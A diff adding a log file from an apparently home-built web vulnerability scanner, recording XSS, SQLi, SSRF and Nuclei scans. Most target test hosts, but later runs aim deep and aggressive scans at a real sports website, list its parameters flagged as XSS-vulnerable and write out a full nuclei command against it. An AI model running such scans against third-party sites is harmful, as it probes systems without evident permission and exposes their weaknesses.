@@ -1,0 +1,1250 @@
+2026-03-22 16:07:38,495 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/get
+2026-03-22 16:07:38,495 - VulnerabilityScanner - INFO - Validating environment...
+2026-03-22 16:07:38,495 - VulnerabilityScanner - INFO - ✅ Python 3.8+
+2026-03-22 16:07:43,195 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/get?test=value
+2026-03-22 16:07:43,195 - VulnerabilityScanner - INFO - Testing 1 parameter(s)
+2026-03-22 16:07:43,195 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 16:07:44,522 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: test (basic_script)
+2026-03-22 16:07:44,537 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 16:07:49,295 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/get?id=1
+2026-03-22 16:07:49,295 - VulnerabilityScanner - INFO - Testing 1 parameter(s)
+2026-03-22 16:07:49,295 - VulnerabilityScanner - INFO - 🔍 [SQLi] Starting SQL Injection scan...
+2026-03-22 16:08:02,845 - VulnerabilityScanner - INFO - ✅ SQLi scan complete
+2026-03-22 16:09:39,016 - VulnerabilityScanner - INFO - Scanner initialized for: https://example.com
+2026-03-22 16:09:39,016 - VulnerabilityScanner - INFO - Validating environment...
+2026-03-22 16:09:39,016 - VulnerabilityScanner - INFO - ✅ Python 3.8+
+2026-03-22 16:09:39,198 - VulnerabilityScanner - INFO - Scanner initialized for: https://example.com/search?q=test
+2026-03-22 16:09:39,198 - VulnerabilityScanner - INFO - Testing 1 parameter(s)
+2026-03-22 16:09:39,198 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 16:09:39,295 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 16:09:39,296 - VulnerabilityScanner - INFO - 🔍 [SQLi] Starting SQL Injection scan...
+2026-03-22 16:09:39,697 - VulnerabilityScanner - INFO - ✅ SQLi scan complete
+2026-03-22 16:09:39,697 - VulnerabilityScanner - INFO - 🔍 [SSRF] Starting SSRF scan...
+2026-03-22 16:09:39,745 - VulnerabilityScanner - INFO - ✅ SSRF scan complete
+2026-03-22 16:09:39,933 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/get?test=value
+2026-03-22 16:09:39,934 - VulnerabilityScanner - INFO - Testing 1 parameter(s)
+2026-03-22 16:09:39,934 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 16:09:41,377 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: test (basic_script)
+2026-03-22 16:09:41,432 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 16:09:41,669 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/get?id=1
+2026-03-22 16:09:41,669 - VulnerabilityScanner - INFO - Testing 1 parameter(s)
+2026-03-22 16:09:41,669 - VulnerabilityScanner - INFO - 🔍 [SQLi] Starting SQL Injection scan...
+2026-03-22 16:09:54,961 - VulnerabilityScanner - INFO - ✅ SQLi scan complete
+2026-03-22 16:09:55,143 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/get?test=1
+2026-03-22 16:09:55,143 - VulnerabilityScanner - INFO - Testing 1 parameter(s)
+2026-03-22 16:09:55,143 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 16:09:56,287 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: test (basic_script)
+2026-03-22 16:09:56,307 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 16:10:58,769 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/get?vulnerable=yes
+2026-03-22 16:10:58,769 - VulnerabilityScanner - INFO - Testing 1 parameter(s)
+2026-03-22 16:10:58,769 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 16:11:00,116 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: vulnerable (basic_script)
+2026-03-22 16:11:00,253 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 16:12:08,941 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/get
+2026-03-22 16:12:08,942 - VulnerabilityScanner - INFO - Validating environment...
+2026-03-22 16:12:08,942 - VulnerabilityScanner - INFO - ✅ Python 3.8+
+2026-03-22 16:16:06,303 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/get?test=1
+2026-03-22 16:16:06,303 - VulnerabilityScanner - INFO - Testing 1 parameter(s)
+2026-03-22 16:16:06,303 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 16:16:07,470 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: test (basic_script)
+2026-03-22 16:16:07,500 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 16:16:07,500 - VulnerabilityScanner - INFO - 🔍 [NUCLEI] Starting Nuclei template-based scanning...
+2026-03-22 16:16:22,222 - VulnerabilityScanner - WARNING - ⚠️  Nuclei scanning error: 'tuple' object has no attribute 'lower'
+2026-03-22 16:16:22,223 - VulnerabilityScanner - INFO - ✅ Nuclei scan complete
+2026-03-22 16:17:09,221 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/get?vulnerable=yes
+2026-03-22 16:17:09,222 - VulnerabilityScanner - INFO - Testing 1 parameter(s)
+2026-03-22 16:17:09,222 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 16:17:10,626 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: vulnerable (basic_script)
+2026-03-22 16:17:10,789 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 16:17:10,790 - VulnerabilityScanner - INFO - 🔍 [NUCLEI] Starting Nuclei template-based scanning...
+2026-03-22 16:23:41,443 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/get?vulnerable=yes
+2026-03-22 16:23:41,444 - VulnerabilityScanner - INFO - Testing 1 parameter(s)
+2026-03-22 16:23:41,444 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 16:23:42,599 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: vulnerable (basic_script)
+2026-03-22 16:23:43,125 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 16:23:43,125 - VulnerabilityScanner - INFO - 🔍 [NUCLEI] Starting Nuclei template-based scanning...
+2026-03-22 16:26:25,725 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/user/test/settings
+2026-03-22 16:26:25,726 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL
+2026-03-22 16:26:25,726 - VulnerabilityScanner - INFO - Testing 6 parameter(s)
+2026-03-22 16:26:25,726 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 16:26:29,888 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 16:26:29,889 - VulnerabilityScanner - INFO - 🔍 [SQLi] Starting SQL Injection scan...
+2026-03-22 16:26:45,521 - VulnerabilityScanner - INFO - ✅ SQLi scan complete
+2026-03-22 16:26:45,521 - VulnerabilityScanner - INFO - 🔍 [SSRF] Starting SSRF scan...
+2026-03-22 16:26:49,463 - VulnerabilityScanner - INFO - ✅ SSRF scan complete
+2026-03-22 16:26:49,464 - VulnerabilityScanner - INFO - 🔍 [PATH-XSS] Starting path-based XSS scanning...
+2026-03-22 16:26:54,543 - VulnerabilityScanner - INFO - ✅ Path-based XSS scan complete
+2026-03-22 16:26:54,543 - VulnerabilityScanner - INFO - 🔍 [NUCLEI] Starting Nuclei template-based scanning...
+2026-03-22 16:27:14,096 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/get?test=1
+2026-03-22 16:27:14,096 - VulnerabilityScanner - INFO - Testing 1 parameter(s)
+2026-03-22 16:27:14,096 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 16:27:15,420 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: test (basic_script)
+2026-03-22 16:27:15,995 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 16:27:15,995 - VulnerabilityScanner - INFO - 🔍 [SQLi] Starting SQL Injection scan...
+2026-03-22 16:27:28,119 - VulnerabilityScanner - INFO - ✅ SQLi scan complete
+2026-03-22 16:27:28,120 - VulnerabilityScanner - INFO - 🔍 [SSRF] Starting SSRF scan...
+2026-03-22 16:27:29,395 - VulnerabilityScanner - INFO - ✅ [SSRF] Found vulnerability: test
+2026-03-22 16:27:29,397 - VulnerabilityScanner - INFO - ✅ [SSRF] Found vulnerability: test
+2026-03-22 16:27:29,430 - VulnerabilityScanner - INFO - ✅ [SSRF] Found vulnerability: test
+2026-03-22 16:27:29,432 - VulnerabilityScanner - INFO - ✅ [SSRF] Found vulnerability: test
+2026-03-22 16:27:29,433 - VulnerabilityScanner - INFO - ✅ SSRF scan complete
+2026-03-22 16:27:29,433 - VulnerabilityScanner - INFO - 🔍 [CUSTOM-PARAM] Starting custom parameter injection scanning...
+2026-03-22 16:27:30,682 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: test
+2026-03-22 16:27:30,787 - VulnerabilityScanner - INFO - ✅ [CUSTOM-PARAM] Found vulnerability in parameter: test
+2026-03-22 16:27:54,421 - VulnerabilityScanner - INFO - ✅ Custom parameter injection scan complete
+2026-03-22 16:27:54,421 - VulnerabilityScanner - INFO - 🔍 [NUCLEI] Starting Nuclei template-based scanning...
+2026-03-22 16:28:15,681 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/get?q=test
+2026-03-22 16:28:15,681 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-22 16:28:15,682 - VulnerabilityScanner - INFO - Testing 1 parameter(s)
+2026-03-22 16:28:15,682 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 16:28:16,879 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: q (basic_script)
+2026-03-22 16:28:22,046 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: q (hex_encode)
+2026-03-22 16:28:22,448 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: q (mixed_encoding)
+2026-03-22 16:28:22,455 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: q (unicode_escape)
+2026-03-22 16:28:23,367 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: q (double_url)
+2026-03-22 16:28:23,427 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: q (case_variation)
+2026-03-22 16:28:24,232 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: q (script_uppercase)
+2026-03-22 16:28:24,233 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 16:28:24,233 - VulnerabilityScanner - INFO - 🔍 [SQLi] Starting SQL Injection scan...
+2026-03-22 16:28:38,243 - VulnerabilityScanner - INFO - ✅ SQLi scan complete
+2026-03-22 16:28:38,243 - VulnerabilityScanner - INFO - 🔍 [SSRF] Starting SSRF scan...
+2026-03-22 16:28:39,574 - VulnerabilityScanner - INFO - ✅ [SSRF] Found vulnerability: q
+2026-03-22 16:28:39,591 - VulnerabilityScanner - INFO - ✅ [SSRF] Found vulnerability: q
+2026-03-22 16:28:39,592 - VulnerabilityScanner - INFO - ✅ [SSRF] Found vulnerability: q
+2026-03-22 16:28:39,594 - VulnerabilityScanner - INFO - ✅ [SSRF] Found vulnerability: q
+2026-03-22 16:28:39,595 - VulnerabilityScanner - INFO - ✅ SSRF scan complete
+2026-03-22 16:28:39,595 - VulnerabilityScanner - INFO - 🔍 [PATH-XSS] Starting path-based XSS scanning...
+2026-03-22 16:28:43,158 - VulnerabilityScanner - INFO - ✅ Path-based XSS scan complete
+2026-03-22 16:28:43,159 - VulnerabilityScanner - INFO - 🔍 [CUSTOM-PARAM] Starting custom parameter injection scanning...
+2026-03-22 16:30:04,604 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/get?vulnerable=test
+2026-03-22 16:30:04,605 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-22 16:30:04,605 - VulnerabilityScanner - INFO - Testing 1 parameter(s)
+2026-03-22 16:30:04,605 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 16:30:05,858 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: vulnerable (basic_script)
+2026-03-22 16:30:10,692 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: vulnerable (unicode_escape)
+2026-03-22 16:30:10,803 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: vulnerable (hex_encode)
+2026-03-22 16:30:11,291 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: vulnerable (mixed_encoding)
+2026-03-22 16:30:11,445 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: vulnerable (double_url)
+2026-03-22 16:30:11,690 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: vulnerable (case_variation)
+2026-03-22 16:30:12,118 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: vulnerable (script_uppercase)
+2026-03-22 16:30:12,120 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 16:30:12,120 - VulnerabilityScanner - INFO - 🔍 [SQLi] Starting SQL Injection scan...
+2026-03-22 16:30:25,126 - VulnerabilityScanner - INFO - ✅ SQLi scan complete
+2026-03-22 16:30:25,126 - VulnerabilityScanner - INFO - 🔍 [SSRF] Starting SSRF scan...
+2026-03-22 16:30:26,245 - VulnerabilityScanner - INFO - ✅ [SSRF] Found vulnerability: vulnerable
+2026-03-22 16:30:26,258 - VulnerabilityScanner - INFO - ✅ [SSRF] Found vulnerability: vulnerable
+2026-03-22 16:30:26,432 - VulnerabilityScanner - INFO - ✅ [SSRF] Found vulnerability: vulnerable
+2026-03-22 16:30:26,725 - VulnerabilityScanner - INFO - ✅ [SSRF] Found vulnerability: vulnerable
+2026-03-22 16:30:26,726 - VulnerabilityScanner - INFO - ✅ SSRF scan complete
+2026-03-22 16:30:26,726 - VulnerabilityScanner - INFO - 🔍 [PATH-XSS] Starting path-based XSS scanning...
+2026-03-22 16:30:29,450 - VulnerabilityScanner - INFO - ✅ Path-based XSS scan complete
+2026-03-22 16:30:29,450 - VulnerabilityScanner - INFO - 🔍 [CUSTOM-PARAM] Starting custom parameter injection scanning...
+2026-03-22 16:30:54,668 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/get?q=test
+2026-03-22 16:30:54,668 - VulnerabilityScanner - INFO - Testing 1 parameter(s)
+2026-03-22 16:30:54,668 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 16:30:56,031 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: q (basic_script)
+2026-03-22 16:30:56,524 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 16:30:56,524 - VulnerabilityScanner - INFO - 🔍 [NUCLEI] Starting Nuclei template-based scanning...
+2026-03-22 16:35:44,687 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/get?test=1
+2026-03-22 16:35:44,688 - VulnerabilityScanner - INFO - Testing 1 parameter(s)
+2026-03-22 16:35:44,688 - VulnerabilityScanner - INFO - 🔍 [NUCLEI] Starting Nuclei template-based scanning...
+2026-03-22 16:46:43,606 - VulnerabilityScanner - INFO - XXEScanner initialized (blind_detection=True)
+2026-03-22 16:46:46,673 - VulnerabilityScanner - INFO - XXEScanner initialized (blind_detection=True)
+2026-03-22 16:48:03,267 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com/standings.aspx
+2026-03-22 16:48:03,267 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-22 16:48:03,267 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL
+2026-03-22 16:48:03,267 - VulnerabilityScanner - INFO - Testing 6 parameter(s)
+2026-03-22 16:48:03,267 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 16:48:55,040 - VulnerabilityScanner - INFO - XXEScanner initialized (blind_detection=True)
+2026-03-22 16:52:35,164 - VulnerabilityScanner - INFO - Scanner initialized for: https://httpbin.org/get
+2026-03-22 16:52:35,164 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL
+2026-03-22 16:52:35,164 - VulnerabilityScanner - INFO - Testing 6 parameter(s)
+2026-03-22 16:52:35,165 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 16:52:39,337 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 16:52:39,337 - VulnerabilityScanner - INFO - 🔍 [NUCLEI] Starting Nuclei template-based scanning...
+2026-03-22 16:53:19,643 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com/standings.aspx
+2026-03-22 16:53:19,643 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-22 16:53:19,643 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL
+2026-03-22 16:53:19,643 - VulnerabilityScanner - INFO - Testing 6 parameter(s)
+2026-03-22 16:53:19,644 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 16:54:03,351 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 16:54:03,351 - VulnerabilityScanner - INFO - 🔍 [PATH-XSS] Starting path-based XSS scanning...
+2026-03-22 16:54:07,455 - VulnerabilityScanner - INFO - ✅ Path-based XSS scan complete
+2026-03-22 16:54:07,455 - VulnerabilityScanner - INFO - 🔍 [CUSTOM-PARAM] Starting custom parameter injection scanning...
+2026-03-22 16:54:55,817 - VulnerabilityScanner - INFO - ✅ Custom parameter injection scan complete
+2026-03-22 16:54:55,818 - VulnerabilityScanner - INFO - 🔍 [NUCLEI-ADVANCED] Starting advanced template scanning...
+2026-03-22 16:55:10,263 - VulnerabilityScanner - WARNING - ⚠️  Advanced Nuclei error: 'tuple' object has no attribute 'strip'
+2026-03-22 16:56:48,125 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com/standings.aspx
+2026-03-22 16:56:48,125 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-22 16:56:48,126 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL
+2026-03-22 16:56:48,126 - VulnerabilityScanner - INFO - Testing 6 parameter(s)
+2026-03-22 16:56:48,126 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 16:58:17,695 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 16:58:17,696 - VulnerabilityScanner - INFO - 🔍 [PATH-XSS] Starting path-based XSS scanning...
+2026-03-22 16:58:22,581 - VulnerabilityScanner - INFO - ✅ Path-based XSS scan complete
+2026-03-22 16:58:22,581 - VulnerabilityScanner - INFO - 🔍 [CUSTOM-PARAM] Starting custom parameter injection scanning...
+2026-03-22 16:59:11,321 - VulnerabilityScanner - INFO - ✅ Custom parameter injection scan complete
+2026-03-22 16:59:11,329 - VulnerabilityScanner - INFO - 🔍 [NUCLEI-ADVANCED] Starting advanced template scanning...
+2026-03-22 16:59:23,476 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com/standings.aspx
+2026-03-22 16:59:23,476 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-22 16:59:23,476 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL
+2026-03-22 16:59:23,476 - VulnerabilityScanner - INFO - Testing 6 parameter(s)
+2026-03-22 16:59:23,476 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 16:59:34,212 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com/schedule.aspx?path=tennis&schedule=4848&xss=test
+2026-03-22 16:59:34,213 - VulnerabilityScanner - INFO - Testing 3 parameter(s)
+2026-03-22 16:59:34,213 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 16:59:38,606 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com/standings.aspx
+2026-03-22 16:59:38,606 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-22 16:59:38,606 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL
+2026-03-22 16:59:38,606 - VulnerabilityScanner - INFO - Testing 6 parameter(s)
+2026-03-22 16:59:38,606 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 16:59:39,867 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 16:59:39,867 - VulnerabilityScanner - INFO - 🔍 [NUCLEI] Starting Nuclei template-based scanning...
+2026-03-22 17:02:20,873 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-22 17:02:20,874 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-22 17:02:20,874 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-22 17:06:05,255 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com/schedule.aspx?path=test&id=test
+2026-03-22 17:06:05,256 - VulnerabilityScanner - INFO - Testing 2 parameter(s)
+2026-03-22 17:06:05,256 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 17:06:08,200 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 17:06:08,200 - VulnerabilityScanner - INFO - 🔍 [NUCLEI] Starting Nuclei template-based scanning...
+2026-03-22 17:06:08,439 - VulnerabilityScanner - INFO - Running: nuclei -u https://big12sports.com/schedule.aspx?path=test&id=test -t cves,vulnerabilities,misconfigurations -json -severity critical,high,medium -timeout 30
+2026-03-22 17:08:04,421 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-22 17:08:04,421 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-22 17:08:04,422 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-22 17:08:04,422 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-22 17:09:40,075 - VulnerabilityScanner - INFO - ✅ Discovered 13 parameters: zipcode, ATCLID, CAT_SPORT_ID, DB_LANG, PALBID, DB_OEM_ID, amp;DB_OEM_ID, MONITOR_AD_ID, CONTENT_ID, SPSID
+2026-03-22 17:09:40,075 - VulnerabilityScanner - INFO - ✓ Discovered 13 parameters from domain
+2026-03-22 17:09:40,075 - VulnerabilityScanner - INFO - Testing 13 parameter(s)
+2026-03-22 17:09:40,076 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 17:13:11,456 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 17:13:11,465 - VulnerabilityScanner - INFO - 🔍 [PATH-XSS] Starting path-based XSS scanning...
+2026-03-22 17:13:11,465 - VulnerabilityScanner - INFO - 🔍 [CUSTOM-PARAM] Starting custom parameter injection scanning...
+2026-03-22 17:13:45,586 - VulnerabilityScanner - INFO - Scanner initialized for: https://example.com/test?id=value&name=test
+2026-03-22 17:13:45,586 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-22 17:13:45,586 - VulnerabilityScanner - INFO - 🔥 Aggressive mode enabled
+2026-03-22 17:14:05,285 - VulnerabilityScanner - INFO - ✅ Custom parameter injection scan complete
+2026-03-22 17:14:05,286 - VulnerabilityScanner - INFO - 🔍 [NUCLEI-ADVANCED] Starting advanced template scanning...
+2026-03-22 17:14:29,913 - VulnerabilityScanner - INFO - Scanner initialized for: https://example.com?id=test
+2026-03-22 17:14:29,913 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-22 17:14:29,913 - VulnerabilityScanner - INFO - Testing 1 parameter(s)
+2026-03-22 17:14:29,913 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 17:14:39,436 - VulnerabilityScanner - INFO - ✅ XSS scan complete
+2026-03-22 17:14:39,436 - VulnerabilityScanner - INFO - 🔍 [PATH-XSS] Starting path-based XSS scanning...
+2026-03-22 17:14:39,437 - VulnerabilityScanner - INFO - 🔍 [CUSTOM-PARAM] Starting custom parameter injection scanning...
+2026-03-22 17:14:41,415 - VulnerabilityScanner - INFO - ✅ Custom parameter injection scan complete
+2026-03-22 17:14:41,415 - VulnerabilityScanner - INFO - 🔍 [NUCLEI-ADVANCED] Starting advanced template scanning...
+2026-03-22 17:18:28,749 - VulnerabilityScanner - INFO - Scanner initialized for: https://big12sports.com
+2026-03-22 17:18:28,750 - VulnerabilityScanner - INFO - ⚡ Deep scanning mode enabled
+2026-03-22 17:18:28,750 - VulnerabilityScanner - WARNING - ⚠️  No parameters found in URL, discovering from domain...
+2026-03-22 17:18:28,750 - VulnerabilityScanner - INFO - 🔍 [PARAM-DISCOVERY] Starting parameter discovery...
+2026-03-22 17:20:06,175 - VulnerabilityScanner - INFO - ✅ Discovered 13 parameters: DB_OEM_ID, zipcode, ATCLID, SPSID, PALBID, CURRENT_PAGE, CONTENT_ID, partner, CAT_SPORT_ID, SPID
+2026-03-22 17:20:06,175 - VulnerabilityScanner - INFO - ✓ Discovered 13 parameters from domain
+2026-03-22 17:20:06,175 - VulnerabilityScanner - INFO - Testing 13 parameter(s)
+2026-03-22 17:20:06,175 - VulnerabilityScanner - INFO - 🔍 [XSS] Starting XSS scan...
+2026-03-22 17:20:08,802 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: DB_OEM_ID (basic_script)
+2026-03-22 17:20:13,466 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: DB_OEM_ID (onload)
+2026-03-22 17:20:15,177 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: DB_OEM_ID (onload_encoded)
+2026-03-22 17:20:18,035 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: DB_OEM_ID (svg_onload_encoded)
+2026-03-22 17:20:18,137 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: DB_OEM_ID (svg_onload)
+2026-03-22 17:20:28,232 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: DB_OEM_ID (data_url)
+2026-03-22 17:20:31,334 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: DB_OEM_ID (data_img)
+2026-03-22 17:20:33,377 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: DB_OEM_ID (mutation_xss)
+2026-03-22 17:20:39,453 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: DB_OEM_ID (script_uppercase)
+2026-03-22 17:20:40,087 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: DB_OEM_ID (case_variation)
+2026-03-22 17:20:40,491 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: zipcode (basic_script)
+2026-03-22 17:20:46,185 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: zipcode (onload_encoded)
+2026-03-22 17:20:46,193 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: zipcode (onload)
+2026-03-22 17:20:48,573 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: zipcode (svg_onload)
+2026-03-22 17:20:49,759 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: zipcode (svg_onload_encoded)
+2026-03-22 17:21:00,794 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: zipcode (data_url)
+2026-03-22 17:21:01,038 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: zipcode (data_img)
+2026-03-22 17:21:05,551 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: zipcode (mutation_xss)
+2026-03-22 17:21:12,416 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: zipcode (case_variation)
+2026-03-22 17:21:12,884 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: zipcode (script_uppercase)
+2026-03-22 17:21:12,993 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: ATCLID (basic_script)
+2026-03-22 17:21:19,025 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: ATCLID (onload)
+2026-03-22 17:21:19,188 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: ATCLID (onload_encoded)
+2026-03-22 17:21:22,669 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: ATCLID (svg_onload)
+2026-03-22 17:21:22,741 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: ATCLID (svg_onload_encoded)
+2026-03-22 17:21:34,531 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: ATCLID (data_url)
+2026-03-22 17:21:35,465 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: ATCLID (data_img)
+2026-03-22 17:21:39,072 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: ATCLID (mutation_xss)
+2026-03-22 17:21:44,438 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: SPSID (basic_script)
+2026-03-22 17:21:44,959 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: ATCLID (case_variation)
+2026-03-22 17:21:45,295 - VulnerabilityScanner - INFO - ✅ [XSS] Found vulnerability: ATCLID (script_uppercase)
